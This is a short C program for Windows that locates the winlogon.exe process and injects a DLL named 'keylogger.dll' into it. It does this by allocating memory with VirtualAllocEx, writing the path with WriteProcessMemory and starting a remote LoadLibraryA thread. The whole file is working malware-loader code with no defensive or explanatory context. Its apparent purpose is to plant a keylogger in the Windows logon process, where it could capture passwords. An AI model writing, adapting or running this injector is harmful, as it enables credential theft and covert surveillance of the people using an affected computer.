#include <windows.h>
#include <stdio.h>

int main() {
    // Get the process ID of winlogon.exe
    DWORD winlogonPID = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, "winlogon.exe") == 0) {
                winlogonPID = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);

    // Open winlogon.exe process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPID);
    if (hProcess == NULL) {
        printf("Failed to open winlogon.exe process\n");
        return 1;
    }

    // Allocate memory in winlogon.exe for the DLL path
    char dllPath[MAX_PATH] = "keylogger.dll"; // Update with your DLL path
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_COMMIT, PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("Failed to allocate memory in winlogon.exe\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Write the DLL path to winlogon.exe process
    if (!WriteProcessMemory(hProcess, remoteBuffer, dllPath, sizeof(dllPath), NULL)) {
        printf("Failed to write DLL path to winlogon.exe process\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Get the address of LoadLibraryA in winlogon.exe
    HMODULE kernel32 = GetModuleHandle("kernel32.dll");
    FARPROC loadLibraryAddr = GetProcAddress(kernel32, "LoadLibraryA");

    // Create a remote thread in winlogon.exe to load the DLL
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteBuffer, 0, NULL);
    if (hRemoteThread == NULL) {
        printf("Failed to create remote thread in winlogon.exe\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hRemoteThread, INFINITE);

    // Cleanup
    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    // Wait indefinitely
    while (1) {
        Sleep(1000);
    }

    return 0;
}
